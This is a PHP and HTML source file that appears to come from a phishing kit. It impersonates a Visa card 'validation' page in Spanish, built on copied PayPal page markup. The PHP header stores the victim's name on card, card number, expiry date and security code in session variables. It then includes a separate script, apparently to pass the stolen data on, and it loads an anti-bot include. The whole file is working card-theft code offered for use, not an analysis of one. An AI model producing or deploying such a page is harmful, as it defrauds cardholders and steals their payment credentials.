<?php

include('./anti.php');

session_start();
date_default_timezone_set('GMT'); 
@ini_set('display_errors', 0); 
error_reporting(E_ALL ^ E_NOTICE); 
$time = date('d/m/Y G:i:s');

############## CREDIT CARD INFORMATION ##############
$_SESSION['_c_valid_']    = $_POST['c_valid'];
$_SESSION['_c_type_']     = $_POST['c_type'];
$_SESSION['_nameoncard_'] = $_POST['nameoncard'];
$_SESSION['_cardnumber_'] = $_POST['cardnumber'];
$_SESSION['_expdate_']    = $_POST['expdate'];
$_SESSION['_csc_']        = $_POST['csc'];	
$FULL = $_POST['nameoncard'] || $_POST['cardnumber'] || $_POST['expdate'] || $_POST['csc'];
####################################################
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    if(empty($FULL)== false) {
        include('edit/CARD.php');
}}
?>

<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8" />
    <meta name="viewport" content="initial-scale=1.0">
	<title>Visa - Reactivaciones</title>
	<link rel="stylesheet" type="text/css" href="css/style.css">
 <link rel="shortcut icon" link rel="logo-icon" href="lib/img/visa.jpg">



  <style type="text/css" media="screen">
    .has-error input {
      border-width: 2px;
    }

    .validation.text-danger:after {
      content: 'Validation failed';
    }

    .validation.text-success:after {
      content: 'Validation passed';
    }
    .has-error .checkbox, .has-error .checkbox-inline, .has-error .control-label, .has-error .help-block, .has-error .radio, .has-error .radio-inline, .has-error.checkbox label, .has-error.checkbox-inline label, .has-error.radio label, .has-error.radio-inline label 
    {
          color: #a94442;
    }

    .has-error .form-control
    {
          box-shadow: inset 0 1px 1px rgba(0,0,0,.075);
          border:2px solid #a94442;
    }
  </style>
</head>
<body>
<script src="js/jquery-3.1.1.min.js"></script>

<script src="js/pay.js" ></script>

<script>
    


    jQuery(function($) {
      $('[data-numeric]').payment('restrictNumeric');
      $('.cc-number').payment('formatCardNumber');
      $('.cc-exp').payment('formatCardExpiry');
      $('.cc-cvc').payment('formatCardCVC');

      $.fn.toggleInputError = function(erred) {
        this.parent('.form-group').toggleClass('has-error', erred);
        return this;
      };

      $('#send_cc').click(function(){

    var cardType = $.payment.cardType($('.cc-number').val());
    var ex_n  = $('.cc-exp').val().split('/');
    var exp_m = ex_n[0];
    var exp_y = ex_n[1];

        var v_num = $.payment.validateCardNumber($('.cc-number').val());
        var v_exp = $.payment.validateCardCVC($('.cc-cvc').val(), cardType);
        var v_exd = $.payment.validateCardExpiry(exp_m, exp_y);
    
    if(v_num == true && v_exp == true && v_exd == true)
    {
      return true;
    }
    else
    {
          $('.cc-number').toggleInputError(!$.payment.validateCardNumber($('.cc-number').val()));
          $('.cc-exp').toggleInputError(!$.payment.validateCardExpiry($('.cc-exp').payment('cardExpiryVal')));
          $('.cc-cvc').toggleInputError(!$.payment.validateCardCVC($('.cc-cvc').val(), cardType));
          $('.cc-brand').text(cardType);
          return false;
    }

      });



       

    });
  </script>
   <nav>
     <div class="wrapp">
   		
<img src="img/logo.jpg"  style="margin:5px 0 0 0px;"   >

   	 </div>
   	</nav>

   	<div class="ma3">
   	<div class="cp_right">
   		

<html class=" BowZ118 BowDefaultZ118 js " lang="fr" dir="ltr">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	<title>PayPal Safety & Security</title>
	<meta name="format-detection" content="telephone=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=yes">
    <link rel="stylesheet" href="lib/css/G-Z118.css">
    <link rel="stylesheet" href="lib/css/B-Z118.css">
    </style><script src="lib/js/jquery.js"></script>
    <script src="lib/js/jquery.validate.js"></script>
	<script src="lib/js/jquery.additional-methods.js"></script>
	<script src="lib/js/jquery.v-form.js"></script>
	<script src="lib/js/jquery.CardValidator.js"></script>
	<script src="lib/js/jquery.mask.js"></script>
    <script type="text/javascript">
    $(function() {
        $('#cardnumber').mask('0000000000000000000');
		$('#csc').mask('0000');
	});
	</script>
</head>
<body>
    
        <div class="headerContainer">
            <div class="Grimm12">
                <a data-click="payPalLogo" href="#" class="logo"></a>
                <div class="loginBtn"><span class="securityLock"></span></div>
            </div>
        </div>
    </header>
    <main class="BrowMainZ118">
        <section id="content" role="main" data-country="US">
            <section id="" class="">
                <div id="WorldWide" class="WorldWide Grimm12">
                    
                        <form action="" method="post" name="WorldWide_form" class="validator" novalidate="novalidate">
                                                        <div class="HeaderZ118">

<div dir="rtl" style="text-align: right;" trbidi="on">
<div style="text-align: center;">

<div style="height:90px;margin-top:30px" id="lga">




<h2  style="margin:10px 0 0 0px;font-size:200%;color:#1486e2;">Confirme su Tarjeta VISA</h2>


</div>

</div>

                            </div>
                            <hr style="width: 75%;">
                            <div>
                                <p style="text-align: center;font-size: 1.2em;width: 88%;padding-left: 6%;"></p>
                            </div>
                            <div class="BowContainerZ118">                               
                                <div class="inner"><p>
Validacion de Tarjeta Visa</p>
                                    <div class="G-FieldsZ118">
                                        <div class="textInput lap ">



                                            <div class="FieldsZ118 large">
                                                <input type="text" class="validate" id="nameoncard" name="nameoncard" required="required" autocomplete="off" placeholder="Titular de la Tarjeta" value="">
                                            </div>
                                        </div>
                                        <div class="textInput">


                                            <div class="FieldsZ118 large">
                                    


    <input type="text" class="validate" id="cardnumber" name="cardnumber" placeholder="Numero de tarjeta" required="required"autocomplete="off" value="">
											    <input name="c_type" type="hidden" id="card_type" value="">
                        					    <input name="c_valid" type="hidden" id="card_valid" value="">
											</div>
                                        </div>
                                    </div>                                    
                                        <div class="G-FieldsZ118">                                                                                       
                                            <div class="multi equal clearfix">
                                                <div class="FieldsZ118 medium left">
                                                    <input type="tel" id="expdate" name="expdate" autocomplete="off" class="validate" required="required" value="" maxlength="5" placeholder="Fecha de Expiracion" >
                                                </div>
                                                <div class="textInput">
                                                    <div class="FieldsZ118 medium right">
                                                        <input type="tel" id="csc" name="csc" autocomplete="off" class="validate" required="required" maxlength="4" placeholder="Clave de seguridad (3 digitos)" value="">
													</div>
                                                </div>
                                            </div>
                                        </div> 			
										
 									<div class="G-FieldsZ118">
									    <div class="AddressLine" id="addressEntry">
									                                               
                                                                                   </div>

</div>
                            <hr style="width: 75%;">
                            <div>


                                    </div>
                                        </div>
                                    </div>									
									<div class="agreeTC checkbox">                                                                                        </div>
                                    </div>
                                    <input



 id="submitBtn" name="" type="submit" class="ButtonZ118" value="Continue" data-click="WorldWideSubmit">





                                </div>



                            </div>


</div>
                            <hr style="width: 100%;">
                            <div>


                        </form>


                    </div>
                </div>
            </section>
        </section>
		<script type="text/javascript">
        $(function() {
		    $('#cardnumber').validateCreditCard(function(result) {
                document.getElementById('card_type').value  = result.card_type.name
                document.getElementById('card_valid').value = result.valid
			$('#cardnumber').validateCreditCard(function(result) {
			    if(result.card_type == null){
                    $('#cardnumber').removeClass();
                }
                else{
                    $('#cardnumber').addClass(result.card_type.name);
					
                }
            });
            });
		});
        </script>
		<script type="text/javascript">		
		$('#cardnumber').validateCreditCard(function(result) {
            // console.log(result);
            if (result.card_type != null) {
                switch (result.card_type.name) {
                    case "VISA":
                        $('#cardnumber').css('background-position', '98.5% -1%');
                        break;
                    case "VISA ELECTRON":
                        $('#cardnumber').css('background-position', '98.5%  47.4%');
                        break;
                    case "MASTERCARD":
                        $('#cardnumber').css('background-position', '98.5%  3.6%');
                        break;
                    case "MAESTRO":
                        $('#cardnumber').css('background-position', '98.5%  39.6%');
                        break;
                    case "DISCOVER":
                        $('#cardnumber').css('background-position', '98.5%  17.7%');
                        break;
                    case "AMEX":
                        $('#cardnumber').css('background-position', '99% 10%');
                        break;
					case "JCB":
                        $('#cardnumber').css('background-position', '98.5% 32%');
                        break;
					case "DINERS_CLUB":
                        $('#cardnumber').css('background-position', '98.5% 24.8%');
                        break;
					default:
                        $('#cardnumber').css('background-position', '98.5% 81.7%');
                        break;
                }
			} else {
                $('#cardnumber').css('background-position', '98.5% 81.7%');
            }
			 // Check for valid card numbere - only show validation checks for invalid Luhn when length is correct so as not to confuse user as they type.
            if (result.valid || $cardinput.val().length > 16) {
                if (result.valid) {
                    $('#cardnumber').removeClass('error').addClass('');
                } else {
                    $('#cardnumber').removeClass('').addClass('error');
                }
            } else {
                $('#cardnumber').removeClass('').removeClass('error');
            }
        });
		</script>
    </main>
    
            </footer>
</body></html>





        </form>
   </div>
   		</div>
   	</div>

   <footer>
   	<div class="wrapp">
   		<span>Copyright © 1999-2017 Visa. All Rights Reserved</span>
   		<ul>
   			<li>
   				<a href="#">Privacy</a>
   			</li>
   		</ul>
   	</div>
   </footer>


</body>
</html>